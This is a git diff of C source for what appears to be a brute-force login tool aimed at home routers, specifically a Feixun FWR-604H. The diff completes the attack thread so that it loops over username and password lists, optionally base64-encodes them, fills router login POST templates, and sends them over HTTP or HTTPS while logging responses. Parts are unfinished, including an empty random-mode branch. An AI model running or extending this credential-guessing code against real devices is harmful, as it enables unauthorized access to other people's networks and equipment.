@@ -15,6 +15,11 @@
 
 #include "brute_force.h"
 
+/*
+ * this module is not recommended because 
+ * it is not complete for the type of router
+ */
+
 static char *StrListDistributor(pStrHeader str_list_header)
 {
     /*
@@ -22,7 +27,7 @@ static char *StrListDistributor(pStrHeader str_list_header)
      * and set the str label to 1(used)
      */
 
-    if (str_list_header->mode != SPECIAL_STR_LIST_MODE)
+    if (str_list_header->str_list_mode == NORMAL_STR_LIST_MODE)
     {
         pStrNode cursor = str_list_header->cursor;
         if (cursor->label != 1)
@@ -41,35 +46,34 @@ static char *StrListDistributor(pStrHeader str_list_header)
 
         return cursor->str;
     }
-    else
+    else if (str_list_header->str_list_mode == REPEAT_STR_LIST_MODE)
     {
         return str_list_header->next->str;
     }
+    else if (str_list_header->str_list_mode == RANDOM_STR_LIST_MODE)
+    {
+
+    }
 }
 
-static char *_GetRequestModel(const char *router_type)
+static char *_RequestModel(const char *router_type)
 {
+    /* only support this router now...
+     * because I just have this router in my home for test
+     */
     if (strcmp(router_type, "feixun_fwr_604h") == 0)
     {
         return FEIXUN_FWR_604H_POST_REQUEST;
-    }
-    else if (strcmp(router_type, "tplink_test") == 0)
-    {
-        return TPLINK_TEST_POST_REQUEST;
     }
     
     return NULL;
 }
 
-static char *_GetRequestPostDataModel(const char *router_type)
+static char *_RequestPostDataModel(const char *router_type)
 {
     if (strcmp(router_type, "feixun_fwr_604h") == 0)
     {
         return FEIXUN_FWR_604H_POST_DATA;
-    }
-    else if (strcmp(router_type, "tplink_test") == 0)
-    {
-        return TPLINK_TEST_POST_DATA;
     }
 
     return NULL;
@@ -89,42 +93,83 @@ static int _AttackThread(pParameter parameter)
     pStrHeader password_header = parameter->_brute_force_st->password_list_header;
     pStrHeader username_header = parameter->_brute_force_st->username_list_header;
 
-    char *request_model = _GetRequestModel(parameter->router_type);
-    char *request = (char *)malloc(strlen(request_model) * 2); // double space
-    char *post_model = _GetRequestPostDataModel(parameter->router_type);
-    char *post = (char *)malloc(strlen(post_model) * 2);
+    char *request_model = _RequestModel(parameter->router_type);
+    char *post_model = _RequestPostDataModel(parameter->router_type);
+
+    char *request = (char *)malloc(MAX_REQUEST_LENGTH);
+    memset(request, 0, MAX_REQUEST_LENGTH);
+
+    char *post_data = (char *)malloc(MAX_REQUEST_POST_DATA_LENGTH);
+    memset(post_data, 0, MAX_REQUEST_POST_DATA_LENGTH);
+
+    char *response = NULL;
+
+    char *base64_username = NULL;
+    char *base64_password = NULL;
+    size_t post_data_len = 0;
 
     for (;;)
     {
-        char *password = StrListDistributor(password_header);
-        if (!password)
+        
+        char *username = StrListDistributor(username_header);
+        if (!username)
         {
             break;
         }
         for (;;)
         {
-            char *username = StrListDistributor(username_header);
-            if (!username)
+            char *password = StrListDistributor(password_header);
+            if (!password)
             {
                 break;
             }
-            if (parameter->username_encrypt_type != NO_ENCRYPT)
+            
+            if (parameter->username_encrypt_type == BASE64_ENCRYPT)
             {
-                if (parameter->username_encrypt_type == BASE64_ENCRYPT)
-                {
-                    //char *base64_username = Base64Encode(username);
-                }
+                base64_username = Base64Encode(username);
+                username = base64_username;
             }
-            sprintf(post, post_model, username, password);
-            sprintf(request, request_model, parameter->target_address, parameter->target_address, post_data_len, post_data)
+
+            if (parameter->password_encrypt_type == BASE64_ENCRYPT)
+            {
+                base64_password = Base64Encode(password);
+                password = base64_password;
+            }
+
+            memset(post_data, 0, strlen(post_data));
+            memset(request, 0, strlen(request));
+
+            sprintf(post_data, post_model, username, password);
+            post_data_len = strlen(post_data);
+            sprintf(request, request_model, parameter->target_address, parameter->target_address, post_data_len, post_data);
+
             if (parameter->address_type == ADDRESS_TYPE_HTTP)
             {
-                HttpMethod(parameter->target_address, parameter->target_port, )
+                if (HttpMethod(parameter->target_address, parameter->target_port, request, &response) == 0)
+                {
+                    BruteForceAttackResponseWrite(response);
+                    free(response);
+                }
+                else
+                {
+                    ErrorMessage("HttpMethod failed");
+                }
             }
-
+            else if (parameter->address_type == ADDRESS_TYPE_HTTPS)
+            {
+                if (HttpsMethod(parameter->target_address, parameter->target_port, request, &response) == 0)
+                {
+                    /* found the result in the file */
+                    BruteForceAttackResponseWrite(response);
+                    free(response);
+                }
+                else
+                {
+                    ErrorMessage("HttpsMethod failed");
+                }
+            }
         }
     }
-
 
     return 0;
 }
@@ -156,7 +201,7 @@ int StartBruteForceAttack(pParameter parameter)
         }
 
         pStrHeader username_list_header;
-        GenBruteForceSpecialUsernameList(parameter->username, &username_list_header);
+        GenBruteForceRepeatUsernameList(parameter->username, &username_list_header);
         parameter->_brute_force_st->username_list_header = username_list_header;
 
         pStrHeader password_list_header;
@@ -180,7 +225,7 @@ int StartBruteForceAttack(pParameter parameter)
         parameter->_brute_force_st->username_list_header = username_list_header;
 
         pStrHeader password_list_header;
-        GenBruteForceSpecialPasswordList(parameter->password, &password_list_header);
+        GenBruteForceRepeatPasswordList(parameter->password, &password_list_header);
         parameter->_brute_force_st->password_list_header = password_list_header;
     }
     else if (brute_force_attack_mode == BRUTE_FORCE_UF_PF)
@@ -217,8 +262,8 @@ int StartBruteForceAttack(pParameter parameter)
         }
         pStrHeader username_list_header;
         pStrHeader password_list_header;
-        GenBruteForceSpecialUsernameList(parameter->username, &username_list_header);
-        GenBruteForceSpecialPasswordList(parameter->password, &password_list_header);
+        GenBruteForceRepeatUsernameList(parameter->username, &username_list_header);
+        GenBruteForceRepeatPasswordList(parameter->password, &password_list_header);
     }
     else if (brute_force_attack_mode == BRUTE_FORCE_US_PR)
     {
@@ -228,7 +273,7 @@ int StartBruteForceAttack(pParameter parameter)
             return -1;
         }
         pStrHeader username_list_header;
-        GenBruteForceSpecialUsernameList(parameter->username, &username_list_header);
+        GenBruteForceRepeatUsernameList(parameter->username, &username_list_header);
 
         pStrHeader password_list_header = (pStrHeader)malloc(sizeof(StrHeader));
         password_list_header->next = NULL;
